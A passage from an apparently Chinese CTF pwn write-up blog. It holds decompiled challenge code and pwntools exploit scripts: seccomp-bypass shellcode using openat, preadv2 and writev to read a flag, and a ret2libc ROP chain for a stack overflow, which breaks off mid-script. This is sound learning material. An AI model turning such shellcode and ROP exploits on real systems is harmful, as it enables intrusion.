keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1337000</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1337000LL</span><span class="token punctuation">,</span> <span class="token number">0x250LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> len <span class="token operator">&lt;=</span> <span class="token number">0xAF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">entrance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"Error triggered..."</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看沙箱内容，发现禁用了<code>execve execveat open read readv pread preadv write sendmsg</code>，最后选择用<code>openat preadv2 writev</code>，需要注意的是<code>preadv2 writev</code>的用法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">59LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">295LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例如下，即<code>preadv2</code>的二参是一个结构体，且这个结构体包含了数据缓冲区地址以及长度，就相当于原来<code>read</code>的二参和三参</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/uio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS_preadv2</span> <span class="token expression"><span class="token number">327</span></span></span><span class="token class-name">ssize_t</span> <span class="token function">preadv2</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_preadv2<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> iov<span class="token punctuation">,</span> iovcnt<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 打开文件</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 准备读取数据的缓冲区</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 设置读取操作的 iovec 结构体</span>    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iov<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_base <span class="token operator">=</span> buffer<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 preadv2 读取文件数据到缓冲区</span>    <span class="token class-name">ssize_t</span> bytes_read <span class="token operator">=</span> <span class="token function">preadv2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_read <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"preadv2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出读取的数据</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> bytes_read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.128.163'</span><span class="token punctuation">,</span> <span class="token number">36703</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00PP'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''/* openat(fd=-0x64, file='flag', oflag=0) */        add rax, 0x62        mov r12, rax        mov rsi, rax        mov rdi, -0x64        /* call openat() */        mov rax, 0x101 /* 0x101 */        syscall        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */        mov rdi, 3        mov rdx, 0x1        add r12, 0x15        mov rsi, r12        /* call preadv2() */        mov rax, 327        syscall        /* writev(fd=1, iovec=0x1337090, count=1) */        mov rdi, 1        mov rdx, 0x1        /* call writev() */        mov rax, 0x14        syscall'''</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> shellcode <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'flag\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1337090</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'entrance'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-6"><a href="#7-6" class="headerlink" title="#7.6"></a>#7.6</h2><p>今天坐大牢，一个知识点没查到肝了半天，下午又被摇过去改申请书嘻嘻，晚上试图逆向分析复现一下比赛，<code>but</code>卡住了工具上，用<code>IDA</code>直接崩，<code>x64dbg</code>调到<code>crash</code>的位置了又换<code>windbg</code>，卡在软件下载和使用上了…都是代理惹的祸~</p><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>先检查保护</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>main</code>函数里存在栈溢出，溢出长度刚好是一个地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"where is my stdout???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点是<code>init</code>函数，输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I&#x2F;O操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过以下方式进行手动刷新缓冲区从而输出缓冲区中的内容：</p><ul><li>显式调用<code>fflush</code>函数</li><li>流被关闭（调用<code>fclose</code>）</li><li>程序正常结束（调用<code>exit</code>）</li></ul><p>程序其他部分包括<code>vuln extend</code>，<code>vuln</code>目的是进行更大长度的栈溢出，而<code>extend</code>是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just to increase the number of got tables"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token char">'!olleh'</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"hello!"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的思路就是先利用<code>extend</code>填满输出缓冲区，再<code>ret2libc</code>，<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">31448</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x40125D</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>pop_rsi_r12_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>extend <span class="token operator">=</span> <span class="token number">0x401287</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>extend<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">54</span> <span class="token operator">+</span> p1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_baseexecve <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token 